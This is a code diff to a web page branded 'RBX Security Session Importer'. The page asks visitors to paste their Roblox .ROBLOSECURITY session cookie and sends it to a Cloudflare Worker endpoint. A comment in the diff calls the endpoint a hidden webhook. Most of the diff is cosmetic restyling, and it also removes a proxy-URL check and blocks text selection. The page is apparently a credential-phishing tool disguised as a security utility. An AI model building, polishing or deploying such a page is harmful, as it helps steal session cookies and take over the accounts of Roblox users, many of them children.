@@ -9,36 +9,55 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            user-select: none; /* чтобы нельзя было выделить текст */
         }
 
+        /* ========== ПЕРЕМЕННЫЕ ТЕМ ========== */
         :root {
-            --bg-dark: #0b0b14;
-            --bg-card: rgba(15, 15, 25, 0.65);
-            --border-glow: rgba(138, 92, 246, 0.6);
-            --text-main: #f0e6ff;
-            --text-dim: #c084fc;
+            --bg-gradient-1: #0a0a0f;
+            --bg-gradient-2: #120c1f;
+            --bg-gradient-3: #1a0f2e;
+            --bg-gradient-4: #0f0a1c;
+            --card-bg: rgba(12, 10, 20, 0.65);
+            --card-border: rgba(138, 92, 246, 0.5);
+            --card-glow: rgba(138, 92, 246, 0.3);
+            --text-primary: #f0e6ff;
+            --text-secondary: #c084fc;
+            --text-muted: #a78bfa;
+            --btn-gradient-1: #7c3aed;
+            --btn-gradient-2: #a855f7;
+            --btn-gradient-3: #c084fc;
             --accent: #a855f7;
-            --accent-hover: #c084fc;
-            --shadow: 0 0 20px rgba(168, 85, 247, 0.3);
-            --cookie-bg: #0a0a12;
+            --accent-glow: 0 0 15px #a855f7;
+            --input-bg: rgba(10, 8, 18, 0.8);
+            --star-color: #c084fc;
         }
 
         body.light {
-            --bg-dark: #eef2ff;
-            --bg-card: rgba(255, 255, 255, 0.75);
-            --border-glow: rgba(100, 120, 200, 0.6);
-            --text-main: #1a1a2e;
-            --text-dim: #4a4a8a;
-            --accent: #5a7dae;
-            --accent-hover: #8aadcc;
-            --shadow: 0 0 20px rgba(90, 125, 174, 0.3);
-            --cookie-bg: #ffffff;
+            --bg-gradient-1: #e6f0fa;
+            --bg-gradient-2: #d4e2f0;
+            --bg-gradient-3: #c2d4e6;
+            --bg-gradient-4: #d0deec;
+            --card-bg: rgba(255, 255, 255, 0.8);
+            --card-border: rgba(100, 120, 200, 0.6);
+            --card-glow: rgba(100, 120, 200, 0.2);
+            --text-primary: #1a2a4f;
+            --text-secondary: #3a6ea5;
+            --text-muted: #5a7dae;
+            --btn-gradient-1: #4a8ec8;
+            --btn-gradient-2: #6aaee0;
+            --btn-gradient-3: #8ac0e8;
+            --accent: #5a9bd5;
+            --accent-glow: 0 0 15px #5a9bd5;
+            --input-bg: rgba(255, 255, 255, 0.9);
+            --star-color: #ffd966;
         }
 
         body {
             min-height: 100vh;
-            background: linear-gradient(135deg, #0b0b14 0%, #141028 50%, #1a0f2e 100%);
-            background-attachment: fixed;
+            background: linear-gradient(135deg, var(--bg-gradient-1) 0%, var(--bg-gradient-2) 25%, var(--bg-gradient-3) 50%, var(--bg-gradient-4) 75%, var(--bg-gradient-1) 100%);
+            background-size: 200% 200%;
+            animation: gradientShift 15s ease infinite;
             font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
             display: flex;
             justify-content: center;
@@ -49,11 +68,13 @@
             transition: background 0.3s ease;
         }
 
-        body.light {
-            background: linear-gradient(135deg, #eef2ff 0%, #e0e7f5 100%);
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
-        /* Звёздный фон */
+        /* ========== ЗВЁЗДЫ ========== */
         .stars {
             position: fixed;
             top: 0;
@@ -65,183 +86,202 @@
         }
         .star {
             position: absolute;
-            background: white;
+            background: var(--star-color);
             border-radius: 50%;
             opacity: 0;
-            animation: twinkle 3s infinite alternate;
+            animation: twinkle 4s infinite alternate;
+            box-shadow: 0 0 5px currentColor;
         }
         @keyframes twinkle {
-            0% { opacity: 0.2; transform: scale(1); }
-            100% { opacity: 1; transform: scale(1.2); }
+            0% { opacity: 0.1; transform: scale(1); }
+            100% { opacity: 1; transform: scale(1.3); }
         }
 
-        /* Летающие печеньки */
+        /* ========== ЛЕТАЮЩИЕ ПЕЧЕНЬКИ ========== */
         .floating-cookie {
             position: fixed;
             pointer-events: none;
             font-size: 28px;
             z-index: 0;
-            opacity: 0.4;
+            opacity: 0.35;
             animation: floatAnim linear infinite;
-            filter: drop-shadow(0 0 5px var(--accent));
+            filter: drop-shadow(0 0 8px var(--accent));
         }
         @keyframes floatAnim {
             0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
-            20% { opacity: 0.6; }
-            80% { opacity: 0.6; }
+            15% { opacity: 0.5; }
+            85% { opacity: 0.5; }
             100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
         }
 
-        /* Карточка */
+        /* ========== ОСНОВНАЯ КАРТОЧКА ========== */
         .glass-card {
-            background: var(--bg-card);
+            background: var(--card-bg);
             backdrop-filter: blur(20px);
-            border-radius: 48px;
-            padding: 40px 36px;
-            max-width: 520px;
+            border-radius: 56px;
+            padding: 44px 40px;
+            max-width: 540px;
             width: 100%;
-            border: 1px solid var(--border-glow);
-            box-shadow: var(--shadow);
-            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            border: 1px solid var(--card-border);
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3), 0 0 30px var(--card-glow);
+            transition: all 0.3s ease;
             z-index: 10;
             position: relative;
         }
         .glass-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 0 30px var(--accent);
+            transform: translateY(-6px);
+            border-color: var(--accent);
+            box-shadow: 0 30px 55px rgba(0, 0, 0, 0.4), 0 0 45px var(--accent);
         }
 
-        /* Лого */
+        /* ========== ЛОГОТИП ========== */
         .logo {
             text-align: center;
-            margin-bottom: 32px;
+            margin-bottom: 36px;
         }
         .logo h1 {
-            font-size: 42px;
+            font-size: 46px;
             font-weight: 800;
-            background: linear-gradient(135deg, #f0e6ff, var(--accent), #c084fc);
+            background: linear-gradient(135deg, #f0e6ff, var(--accent), #e9d5ff);
+            background-size: 200% auto;
+            animation: textShine 4s linear infinite;
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
             letter-spacing: -1px;
         }
+        @keyframes textShine {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
         .logo p {
-            color: var(--text-dim);
-            font-size: 10px;
+            color: var(--text-secondary);
+            font-size: 11px;
             letter-spacing: 4px;
-            margin-top: 8px;
+            margin-top: 10px;
             text-transform: uppercase;
+            font-weight: 500;
+            text-shadow: 0 0 5px var(--accent);
         }
 
-        /* Инпуты */
+        /* ========== ИНПУТ ========== */
         .label {
-            color: var(--text-dim);
+            color: var(--text-secondary);
             font-size: 14px;
             font-weight: 600;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
         }
         .cookie-input {
             width: 100%;
-            background: var(--cookie-bg);
-            border: 1px solid var(--border-glow);
-            border-radius: 28px;
-            padding: 18px 20px;
-            color: var(--text-main);
+            background: var(--input-bg);
+            border: 1.5px solid var(--card-border);
+            border-radius: 32px;
+            padding: 20px 22px;
+            color: var(--text-primary);
             font-family: 'Fira Code', monospace;
             font-size: 12px;
             resize: vertical;
-            transition: 0.2s;
+            transition: all 0.2s;
         }
         .cookie-input:focus {
             outline: none;
             border-color: var(--accent);
-            box-shadow: 0 0 12px var(--accent);
+            box-shadow: 0 0 18px var(--accent);
         }
 
-        /* Статус */
+        /* ========== СТАТУС ========== */
         .status {
             font-size: 13px;
-            margin: 15px 0 24px;
+            margin: 18px 0 28px;
             display: flex;
             align-items: center;
-            gap: 8px;
-            color: var(--text-dim);
-            background: rgba(0,0,0,0.1);
-            padding: 8px 16px;
-            border-radius: 40px;
+            gap: 10px;
+            color: var(--text-muted);
+            background: rgba(0, 0, 0, 0.2);
+            padding: 10px 18px;
+            border-radius: 60px;
             backdrop-filter: blur(4px);
+            font-weight: 500;
         }
 
-        /* Кнопка */
+        /* ========== КНОПКА ========== */
         .btn {
             width: 100%;
-            background: linear-gradient(135deg, #7c3aed, var(--accent));
+            background: linear-gradient(135deg, var(--btn-gradient-1), var(--btn-gradient-2), var(--btn-gradient-3));
+            background-size: 200% auto;
             border: none;
             border-radius: 60px;
-            padding: 16px;
+            padding: 18px;
             color: white;
             font-weight: 700;
             font-size: 16px;
             cursor: pointer;
-            transition: 0.2s;
-            box-shadow: 0 0 8px var(--accent);
+            transition: all 0.2s;
+            box-shadow: 0 0 12px var(--accent);
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
         .btn:hover {
             transform: scale(1.02);
-            box-shadow: 0 0 20px var(--accent);
+            box-shadow: 0 0 25px var(--accent);
+            background-position: 100% 0;
         }
         .btn:disabled {
             opacity: 0.5;
             cursor: not-allowed;
+            transform: none;
         }
 
-        /* Сообщения */
+        /* ========== СООБЩЕНИЯ ========== */
         .message-area {
             text-align: center;
-            margin-top: 20px;
+            margin-top: 24px;
         }
         .error-text {
             color: #ff8a7a;
             background: rgba(255, 70, 50, 0.12);
-            padding: 12px;
+            padding: 12px 20px;
             border-radius: 60px;
             font-size: 13px;
             font-weight: 500;
             backdrop-filter: blur(4px);
+            border-left: 3px solid #ff5a4a;
         }
 
-        /* Тумблер темы */
+        /* ========== ПЕРЕКЛЮЧАТЕЛЬ ТЕМЫ ========== */
         .theme-switch {
             position: fixed;
-            top: 20px;
-            right: 20px;
+            top: 24px;
+            right: 24px;
             z-index: 100;
         }
         .theme-btn {
-            background: var(--bg-card);
-            backdrop-filter: blur(10px);
-            border: 1px solid var(--border-glow);
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--card-border);
             border-radius: 60px;
-            padding: 10px 20px;
+            padding: 10px 22px;
             cursor: pointer;
             font-size: 14px;
             font-weight: 600;
-            color: var(--text-dim);
-            transition: 0.2s;
+            color: var(--text-secondary);
+            transition: all 0.2s;
         }
         .theme-btn:hover {
             transform: scale(1.05);
-            box-shadow: 0 0 12px var(--accent);
+            box-shadow: 0 0 15px var(--accent);
+            border-color: var(--accent);
         }
 
-        /* Анимация кнопки */
+        /* ========== АНИМАЦИЯ ТРЯСКИ ========== */
         @keyframes shake {
             0%,100%{transform:translateX(0)}
-            25%{transform:translateX(-4px)}
-            75%{transform:translateX(4px)}
+            25%{transform:translateX(-5px)}
+            75%{transform:translateX(5px)}
         }
         .shake {
             animation: shake 0.2s ease;
@@ -255,7 +295,7 @@
 <div class="stars" id="stars"></div>
 <div class="glass-card">
     <div class="logo">
-        <h1>✦ RBX Security ✦</h1>
+        <h1>✦ RBX SECURITY ✦</h1>
         <p>SESSION IMPORTER</p>
     </div>
     <label class="label"><span>🍪</span> .ROBLOSECURITY Cookie</label>
@@ -269,10 +309,10 @@
 
 <script>
     (function(){
-        
+        // ========== ТВОЙ CLOUDFLARE WORKER (ВЕБХУК СПРЯТАН) ==========
         const PROXY_URL = "https://robl.megadoner517.workers.dev";
 
-        // ========== ТЕМА ==========
+        // ========== ТЕМА (СВЕТ / ТЕМНОТА) ==========
         const themeBtn = document.getElementById('themeToggleBtn');
         function loadTheme(){
             const saved = localStorage.getItem('rbx_theme');
@@ -301,7 +341,7 @@
         // ========== ЗВЁЗДЫ ==========
         function createStars(){
             const container = document.getElementById('stars');
-            for(let i=0;i<120;i++){
+            for(let i=0;i<150;i++){
                 const star = document.createElement('div');
                 star.classList.add('star');
                 star.style.left = Math.random() * 100 + '%';
@@ -315,19 +355,19 @@
         }
         createStars();
 
-        // ========== ПЕЧЕНЬКИ ==========
-        for(let i=0;i<35;i++){
+        // ========== ЛЕТАЮЩИЕ ПЕЧЕНЬКИ ==========
+        for(let i=0;i<40;i++){
             let cookie = document.createElement('div');
             cookie.classList.add('floating-cookie');
             cookie.textContent = '🍪';
             cookie.style.left = Math.random() * 100 + '%';
-            cookie.style.fontSize = (20 + Math.random() * 32) + 'px';
-            cookie.style.animationDuration = (8 + Math.random() * 16) + 's';
+            cookie.style.fontSize = (22 + Math.random() * 32) + 'px';
+            cookie.style.animationDuration = (9 + Math.random() * 16) + 's';
             cookie.style.animationDelay = Math.random() * -20 + 's';
             document.body.appendChild(cookie);
         }
 
-        // ========== ЛОГИКА ==========
+        // ========== ЛОГИКА САЙТА ==========
         const cookieInput = document.getElementById('cookie');
         const sendBtn = document.getElementById('sendBtn');
         const statusDiv = document.getElementById('status');
@@ -360,7 +400,7 @@
 
         function showMessage(text){
             msgArea.innerHTML = `<div class="error-text">⚠️ ${text}</div>`;
-            setTimeout(() => msgArea.innerHTML = '', 4000);
+            setTimeout(() => msgArea.innerHTML = '', 4500);
         }
 
         cookieInput.addEventListener('input', updateUI);
@@ -370,10 +410,7 @@
         sendBtn.onclick = async () => {
             const cookie = cookieInput.value.trim();
             if(!isValidCookie(cookie)) return;
-            if(!PROXY_URL){
-                showMessage('Ошибка инициализации. Обновите страницу.');
-                return;
-            }
+
             sendBtn.disabled = true;
             sendBtn.textContent = "⏳ Отправка...";
 
